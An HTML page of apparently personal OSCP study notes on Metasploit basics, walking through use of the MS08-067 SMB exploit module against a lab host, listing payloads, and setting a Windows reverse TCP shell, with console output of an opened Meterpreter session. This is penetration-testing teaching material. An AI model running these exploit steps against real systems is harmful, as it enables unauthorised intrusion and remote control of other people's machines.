



<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
      
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../../assets/images/favicon.ico">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.1.2">
    
    
      
        <title>Metasploit</title>
      
    
	
    
      <link rel="stylesheet" href="../../assets/stylesheets/application.3020aac5.css">
      
        <link rel="stylesheet" href="../../assets/stylesheets/application-palette.224b79ff.css">
      
      
        
        
        <meta name="theme-color" content="">
      
    
    
      <script src="../../assets/javascripts/modernizr.74668098.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../../assets/css/extra.css">
    
      <link rel="stylesheet" href="../../assets/css/mermaid.css">
    
    
      
    
    
  </head>
  
    
    
    <body dir="ltr" data-md-color-primary="white" data-md-color-accent="grey">
  
    <svg class="md-svg">
      <defs>
        
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#metasploit_basics" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="../.." title="ha2332" class="md-header-nav__button md-logo">
          
            <img src="../../assets/images/logo-black-big.png" width="24" height="24">
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              ha2332
            </span>
            <span class="md-header-nav__topic">
              Metasploit
            </span>
          
        </div>
      </div>
	  <!-- custom code -->
	  <div class="md-flex__cell md-flex__cell--shrink">
        <button id="toggle-sidebar"><i class="material-icons">
			calendar_view_day
		</i></button>
      </div>
	  <!-- custom code -->
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
        

  

<nav class="md-tabs md-tabs--active" data-md-component="tabs">
  <div class="md-tabs__inner md-grid">
    <ul class="md-tabs__list">
      
        
  <li class="md-tabs__item">
    
      <a href="../.." title="Home" class="md-tabs__link">
        Home
      </a>
    
  </li>

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../linux/linux-fundamentals/" title="Linux" class="md-tabs__link">
          Linux
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../oscp/" title="Oscp" class="md-tabs__link">
          Oscp
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../programming/bash-scripting/" title="Programming" class="md-tabs__link">
          Programming
        </a>
      
    </li>
  

      
        
      
    </ul>
  </div>
</nav>
      
      <main class="md-main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href="../.." title="ha2332" class="md-nav__button md-logo">
      
        <img src="../../assets/images/logo-black-big.png" width="48" height="48">
      
    </a>
    ha2332
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href="../.." title="Home" class="md-nav__link">
      Home
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
    
    <label class="md-nav__link" for="nav-2">
      Linux
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        Linux
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
			
			  
			  
			  


  <li class="md-nav__item">
    <a href="../../linux/linux-fundamentals/" title="Linux Fundamentals" class="md-nav__link">
      Linux Fundamentals
    </a>
  </li>

			
        
			
			  
			  
			  


  <li class="md-nav__item">
    <a href="../../linux/linux_cmd/" title="Linux Command Line" class="md-nav__link">
      Linux Command Line
    </a>
  </li>

			
        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
    
    <label class="md-nav__link" for="nav-3">
      Oscp
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-3">
        Oscp
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
			
			  
			  
			  


  <li class="md-nav__item">
    <a href="../../oscp/" title="OSCP Prep Guide" class="md-nav__link">
      OSCP Prep Guide
    </a>
  </li>

			
        
			
			  
			  
			  


  <li class="md-nav__item">
    <a href="../../oscp/links/" title="OSCP Links" class="md-nav__link">
      OSCP Links
    </a>
  </li>

			
        
			
			  
			  
			  


  <li class="md-nav__item">
    <a href="../../oscp/recon/information-gathering/" title="Information Gathering" class="md-nav__link">
      Information Gathering
    </a>
  </li>

			
        
			
			  
			  
			  


  <li class="md-nav__item">
    <a href="../../oscp/scanning/network_discovery/" title="Network discovery" class="md-nav__link">
      Network discovery
    </a>
  </li>

			
        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
    
    <label class="md-nav__link" for="nav-4">
      Programming
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-4">
        Programming
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
			
			  
			  
			  


  <li class="md-nav__item">
    <a href="../../programming/bash-scripting/" title="Bash Scripting" class="md-nav__link">
      Bash Scripting
    </a>
  </li>

			
        
			
			  
			  
			  


  <li class="md-nav__item">
    <a href="../../programming/c-programming/" title="C Programming" class="md-nav__link">
      C Programming
    </a>
  </li>

			
        
			
			  
			  
			  


  <li class="md-nav__item">
    <a href="../../programming/python-programming/" title="Python Programming" class="md-nav__link">
      Python Programming
    </a>
  </li>

			
        
      </ul>
    </nav>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        Metasploit
      </label>
    
    <a href="./" title="Metasploit" class="md-nav__link md-nav__link--active">
      Metasploit
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#metasploit_basics" title="Metasploit Basics" class="md-nav__link">
    Metasploit Basics
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#starting_metasploit" title="Starting Metasploit" class="md-nav__link">
    Starting Metasploit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#finding_metasploit_modules" title="Finding Metasploit Modules" class="md-nav__link">
    Finding Metasploit Modules
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enabling_the_module" title="Enabling The Module" class="md-nav__link">
    Enabling The Module
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#setting_module_options" title="Setting Module Options" class="md-nav__link">
    Setting Module Options
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#payloads" title="Payloads" class="md-nav__link">
    Payloads
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#running_the_exploit" title="Running The Exploit" class="md-nav__link">
    Running The Exploit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#type_of_shells" title="Type of Shells" class="md-nav__link">
    Type of Shells
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#setting_payload_manually" title="Setting Payload Manually" class="md-nav__link">
    Setting Payload Manually
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#msfcli" title="Msfcli" class="md-nav__link">
    Msfcli
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#creating_standalone_payloads_with_msfvenom" title="Creating Standalone Payloads With Msfvenom" class="md-nav__link">
    Creating Standalone Payloads With Msfvenom
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#serving_payloads" title="Serving Payloads" class="md-nav__link">
    Serving Payloads
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using_an_auxiliary_module" title="Using an Auxiliary Module" class="md-nav__link">
    Using an Auxiliary Module
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#upgrading_metasploit" title="Upgrading Metasploit" class="md-nav__link">
    Upgrading Metasploit
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#metasploit_basics" title="Metasploit Basics" class="md-nav__link">
    Metasploit Basics
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#starting_metasploit" title="Starting Metasploit" class="md-nav__link">
    Starting Metasploit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#finding_metasploit_modules" title="Finding Metasploit Modules" class="md-nav__link">
    Finding Metasploit Modules
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enabling_the_module" title="Enabling The Module" class="md-nav__link">
    Enabling The Module
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#setting_module_options" title="Setting Module Options" class="md-nav__link">
    Setting Module Options
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#payloads" title="Payloads" class="md-nav__link">
    Payloads
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#running_the_exploit" title="Running The Exploit" class="md-nav__link">
    Running The Exploit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#type_of_shells" title="Type of Shells" class="md-nav__link">
    Type of Shells
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#setting_payload_manually" title="Setting Payload Manually" class="md-nav__link">
    Setting Payload Manually
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#msfcli" title="Msfcli" class="md-nav__link">
    Msfcli
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#creating_standalone_payloads_with_msfvenom" title="Creating Standalone Payloads With Msfvenom" class="md-nav__link">
    Creating Standalone Payloads With Msfvenom
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#serving_payloads" title="Serving Payloads" class="md-nav__link">
    Serving Payloads
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using_an_auxiliary_module" title="Using an Auxiliary Module" class="md-nav__link">
    Using an Auxiliary Module
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#upgrading_metasploit" title="Upgrading Metasploit" class="md-nav__link">
    Upgrading Metasploit
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav> 
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                
                  <h1>Metasploit</h1>
                
                <h2 id="metasploit_basics">Metasploit Basics</h2>
<h3 id="starting_metasploit">Starting Metasploit</h3>
<p>Metasploit uses postgresql as the backend database</p>
<ul>
<li>start the postgresql database</li>
</ul>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>root@kali:~# service postgresql start
</pre></div>
</td></tr></table>

<p>The command creates a postgresql user <code class="codehilite">msf3</code> and a database to store the data</p>
<ul>
<li>start the webserver </li>
</ul>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>root@kali:~# service metasploit start
</pre></div>
</td></tr></table>

<p>The above command starts metasploit's Remote Procedure Call (RPC) server and web server</p>
<ul>
<li>start the interface</li>
</ul>
<p>There are <strong>multiple</strong> interfaces to metasploit. <strong>msfconsole</strong> is a text based interface to metasploit.</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>root@kali:~# msfconsole
</pre></div>
</td></tr></table>

<p>The above command will start a console</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


Large pentest? List, sort, group, tag and search your hosts and services
in Metasploit Pro -- type &#39;go_pro&#39; to launch it now.

       =[ metasploit v4.8.2-2014010101 [core:4.8 api:1.0]
+ -- --=[ 1246 exploits - 678 auxiliary - 198 post
+ -- --=[ 324 payloads - 32 encoders - 8 nops

msf &gt;
</pre></div>
</td></tr></table>

<ul>
<li>getting help</li>
</ul>
<p>use the <code class="codehilite">help</code> command to get help</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>msf &gt; help route
Usage: route [add/remove/get/flush/print] subnet netmask [comm/sid]

Route traffic destined to a given subnet through a supplied session.
The default comm is Local...
</pre></div>
</td></tr></table>

<h3 id="finding_metasploit_modules">Finding Metasploit Modules</h3>
<p>Metasploit also has an online database of modules (<a href="http://www.rapid7.com/db/modules/">http://www.rapid7.com/db/modules/</a>) and a built-in search function that can be used to search for the correct modules.</p>
<ul>
<li>built-in search</li>
</ul>
<p>searching for a metasploit module - use the <code class="codehilite">search</code> command</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>msf &gt; search ms08-067

Matching Modules
================

   Name                                 Disclosure Date          Rank   Description
   ----                                 ---------------          ----   -----------
   exploit/windows/smb/ms08_067_netapi  2008-10-28 00:00:00 UTC  great  Microsoft Server
                                                                          Service Relative Path
                                                                          Stack Corruption
</pre></div>
</td></tr></table>

<p><code class="codehilite">exploit/windows/smb/ms08_067_netapi</code> is the module name</p>
<p>getting more info about the module - use the <code class="codehilite">info</code> command</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41</pre></div></td><td class="code"><div class="codehilite"><pre><span></span> msf &gt; info exploit/windows/smb/ms08_067_netapi

        ❶Name: Microsoft Server Service Relative Path Stack Corruption
      ❷Module: exploit/windows/smb/ms08_067_netapi
      Version: 0
    ❸Platform: Windows
  ❹Privileged: Yes
      License: Metasploit Framework License (BSD)
        ❺Rank: Great

❻ Available targets:
    Id  Name
    --  ----
    0   Automatic Targeting
    1   Windows 2000 Universal
    2   Windows XP SP0/SP1 Universal
    --snip--
    67  Windows 2003 SP2 Spanish (NX)

  ❼ Basic options:
    Name     Current Setting  Required  Description
    ----     ---------------  --------  -----------
    RHOST                     yes       The target address
    RPORT    445              yes       Set the SMB service port
    SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

❽ Payload information:
    Space: 400
    Avoid: 8 characters
❾ Description:
    This module exploits a parsing flaw in the path canonicalization
    code of NetAPI32.dll through the Server Service. This module is
    capable of bypassing NX on some operating systems and service packs.
    The correct target must be used to prevent the Server Service (along
    with a dozen others in the same process) from crashing. Windows XP
    targets seem to handle multiple successful exploitation events, but
    2003 targets will often crash or hang on subsequent attempts. This
    is just the first version of this module, full support for NX bypass
    on 2003, along with other platforms, is still in development.
❿ References:
    http://www.microsoft.com/technet/security/bulletin/MS08-067.mspx
</pre></div>
</td></tr></table>

<h3 id="enabling_the_module">Enabling The Module</h3>
<p>use the <code class="codehilite">use</code> command to set the exploit module</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>msf &gt; use windows/smb/ms08_067_netapi
msf  exploit(ms08_067_netapi) &gt;
</pre></div>
</td></tr></table>

<h3 id="setting_module_options">Setting Module Options</h3>
<p>use the <code class="codehilite">show options</code> command to show the module options that need to be set</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="n">msf</span>  <span class="n">exploit</span><span class="p">(</span><span class="n">ms08_067_netapi</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">show</span> <span class="n">options</span>

<span class="k">Module</span> <span class="nn">options</span> <span class="p">(</span><span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">ms08_067_netapi</span><span class="p">):</span>

   <span class="n">Name</span>     <span class="n">Current</span> <span class="n">Setting</span>  <span class="n">Required</span>  <span class="n">Description</span>
   <span class="o">----</span>     <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
  <span class="n">RHOST</span>                     <span class="n">yes</span>       <span class="n">The</span> <span class="n">target</span> <span class="n">address</span>
  <span class="n">RPORT</span>    <span class="mi">445</span>              <span class="n">yes</span>       <span class="k">Set</span> <span class="n">the</span> <span class="n">SMB</span> <span class="n">service</span> <span class="n">port</span>
  <span class="n">SMBPIPE</span>  <span class="n">BROWSER</span>          <span class="n">yes</span>       <span class="n">The</span> <span class="n">pipe</span> <span class="n">name</span> <span class="k">to</span> <span class="n">use</span> <span class="p">(</span><span class="n">BROWSER</span><span class="p">,</span> <span class="n">SRVSVC</span><span class="p">)</span>

<span class="n">Exploit</span> <span class="n">target</span><span class="p">:</span>

   <span class="n">Id</span>  <span class="n">Name</span>
   <span class="o">--</span>  <span class="o">----</span>
   <span class="mi">0</span>   <span class="n">Automatic</span> <span class="n">Targeting</span>


<span class="n">msf</span>  <span class="n">exploit</span><span class="p">(</span><span class="n">ms08_067_netapi</span><span class="p">)</span> <span class="o">&gt;</span>
</pre></div>
</td></tr></table>

<p><code class="codehilite">RHOST</code> - refers to the remote host to exploit<br />
<code class="codehilite">RPORT</code> - refers to the remote port to attack<br />
<code class="codehilite">SMBPIPE</code> - used for Windows Interprocess Communication  </p>
<ul>
<li>setting remote host</li>
</ul>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>msf  exploit(ms08_067_netapi) &gt; set RHOST 192.168.20.10
</pre></div>
</td></tr></table>

<ul>
<li>setting remote port</li>
</ul>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>msf  exploit(ms08_067_netapi) &gt; set RPORT 445
</pre></div>
</td></tr></table>

<ul>
<li>setting SMBPIPE</li>
</ul>
<p>leave it at default</p>
<ul>
<li>exploit target</li>
</ul>
<p>the target operating system and version. view available targets with the following command</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>msf  exploit(ms08_067_netapi) &gt; show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic Targeting
   1   Windows 2000 Universal
   2   Windows XP SP0/SP1 Universal
   3   Windows XP SP2 English (AlwaysOn NX)
   4   Windows XP SP2 English (NX)
   5   Windows XP SP3 English (AlwaysOn NX)
   --snip--
   67  Windows 2003 SP2 Spanish (NX)
</pre></div>
</td></tr></table>

<ul>
<li>setting the target</li>
</ul>
<p>set the type of target machine</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>msf  exploit(ms08_067_netapi) &gt; set target _&lt;target_number&gt;_
</pre></div>
</td></tr></table>

<h3 id="payloads">Payloads</h3>
<p>Payloads tell what the system should do after the exploit is successful</p>
<ul>
<li>find compatible payloads</li>
</ul>
<p>use ths <code class="codehilite">show payloads</code> command to see compatible payloads</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>msf  exploit(ms08_067_netapi) &gt; show payloads

Compatible Payloads
===================

   Name                                Disclosure Date  Rank    Description
   ----                                ---------------  ----    -----------
   generic/custom                                       normal  Custom Payload
   generic/debug_trap                                   normal  Generic x86 Debug Trap
   generic/shell_bind_tcp                               normal  Generic Command Shell, Bind TCP
                                                                  Inline
   generic/shell_reverse_tcp                            normal  Generic Command Shell, Reverse
                                                                  Inline
   generic/tight_loop                                   normal  Generic x86 Tight Loop
   windows/dllinject/bind_ipv6_tcp                      normal  Reflective DLL Injection, Bind
                                                                  TCP Stager (IPv6)
   windows/dllinject/bind_nonx_tcp                      normal  Reflective DLL Injection, Bind
                                                                  TCP Stager (No NX or Win7)
   windows/dllinject/bind_tcp                           normal  Reflective DLL Injection, Bind
                                                                  TCP Stager
   windows/dllinject/reverse_http                       normal  Reflective DLL Injection, Reverse
                                                                  HTTP Stager
--snip--
   windows/vncinject/reverse_ipv6_http                  normal  VNC Server (Reflective Injection),
                                                                  Reverse HTTP Stager (IPv6)
   windows/vncinject/reverse_ipv6_tcp                   normal  VNC Server (Reflective Injection),
                                                                  Reverse TCP Stager (IPv6)
--snip--
   windows/vncinject/reverse_tcp                        normal  VNC Server (Reflective Injection),
                                                                  Reverse TCP Stager
   windows/vncinject/reverse_tcp_allports               normal  VNC Server (Reflective Injection),
                                                                  Reverse All-Port TCP Stager
   windows/vncinject/reverse_tcp_dns                    normal  VNC Server (Reflective Injection),
                                                                  Reverse TCP Stager (DNS)
</pre></div>
</td></tr></table>

<div class="admonition note">
<p class="admonition-title">Note</p>
<p>If payload is not set, metasploit will automatically choose the default payload and associated settings and run it.</p>
</div>
<h3 id="running_the_exploit">Running The Exploit</h3>
<p>use the <code class="codehilite">exploit</code> command to run the exploit</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>msf  exploit(ms08_067_netapi) &gt; exploit

[*] Started reverse handler on 192.168.20.9:4444
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] Attempting to trigger the vulnerability...
[*] Sending stage (752128 bytes) to 192.168.20.10
[*] Meterpreter session 1 opened (192.168.20.9:4444 -&gt; 192.168.20.10:1334) at
2015-08-31 07:37:05 -0400

meterpreter &gt;
</pre></div>
</td></tr></table>

<ul>
<li>to exit use the <code class="codehilite">exit</code> command</li>
</ul>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>meterpreter &gt; exit
[*] Shutting down Meterpreter...

[*] Meterpreter session 1 closed.  Reason: User exit
msf  exploit(ms08_067_netapi) &gt;
</pre></div>
</td></tr></table>

<h3 id="type_of_shells">Type of Shells</h3>
<p>Shells fall into two categories</p>
<ul>
<li>bind shells</li>
<li>
<p>reverse shells</p>
</li>
<li>
<p>Bind Shells</p>
</li>
</ul>
<p>A <em>bind shell</em> instructs the target machine to open a command shell and listen on a local port. The attack machine then connects to the target machine on the listening port. </p>
<ul>
<li>Reverse Shells</li>
</ul>
<p>A <em>reverse shell</em>, actively pushes a connection back to the attack machine rather than waiting for an incoming connection. In the attack machine, we open a local port and listen for a connection from our target because this reverse connection is more likely to make it through a firewall.</p>
<h3 id="setting_payload_manually">Setting Payload Manually</h3>
<p>use the <code class="codehilite">set payload</code> command to specify the payload</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>msf  exploit(ms08_067_netapi) &gt; set payload windows/shell_reverse_tcp
payload =&gt; windows/shell_reverse_tcp
</pre></div>
</td></tr></table>

<p>Since a reverse shell is used, specify the local host and port to listen on</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="n">msf</span>  <span class="n">exploit</span><span class="p">(</span><span class="n">ms08_067_netapi</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">show</span> <span class="n">options</span>

<span class="k">Module</span> <span class="nn">options</span> <span class="p">(</span><span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">ms08_067_netapi</span><span class="p">):</span>

   <span class="n">Name</span>     <span class="n">Current</span> <span class="n">Setting</span>  <span class="n">Required</span>  <span class="n">Description</span>
   <span class="o">----</span>     <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
   <span class="n">RHOST</span>    <span class="mf">192.168</span><span class="p">.</span><span class="mf">20.10</span>    <span class="n">yes</span>       <span class="n">The</span> <span class="n">target</span> <span class="n">address</span>
   <span class="n">RPORT</span>    <span class="mi">445</span>              <span class="n">yes</span>       <span class="k">Set</span> <span class="n">the</span> <span class="n">SMB</span> <span class="n">service</span> <span class="n">port</span>
   <span class="n">SMBPIPE</span>  <span class="n">BROWSER</span>          <span class="n">yes</span>       <span class="n">The</span> <span class="n">pipe</span> <span class="n">name</span> <span class="k">to</span> <span class="n">use</span> <span class="p">(</span><span class="n">BROWSER</span><span class="p">,</span> <span class="n">SRVSVC</span><span class="p">)</span>


<span class="n">Payload</span> <span class="n">options</span> <span class="p">(</span><span class="n">windows</span><span class="o">/</span><span class="n">shell_reverse_tcp</span><span class="p">):</span>

   <span class="n">Name</span>      <span class="n">Current</span> <span class="n">Setting</span>  <span class="n">Required</span>  <span class="n">Description</span>
   <span class="o">----</span>      <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
   <span class="n">EXITFUNC</span>  <span class="n">thread</span>           <span class="n">yes</span>       <span class="k">Exit</span> <span class="n">technique</span><span class="p">:</span> <span class="n">seh</span><span class="p">,</span> <span class="n">thread</span><span class="p">,</span> <span class="n">process</span><span class="p">,</span> <span class="n">none</span>
<span class="hll">  <span class="err">❶</span><span class="n">LHOST</span>                      <span class="n">yes</span>       <span class="n">The</span> <span class="n">listen</span> <span class="n">address</span>
</span><span class="hll">   <span class="n">LPORT</span>     <span class="mi">4444</span>             <span class="n">yes</span>       <span class="n">The</span> <span class="n">listen</span> <span class="n">port</span>
</span>

<span class="n">Exploit</span> <span class="n">target</span><span class="p">:</span>

   <span class="n">Id</span>  <span class="n">Name</span>
   <span class="o">--</span>  <span class="o">----</span>
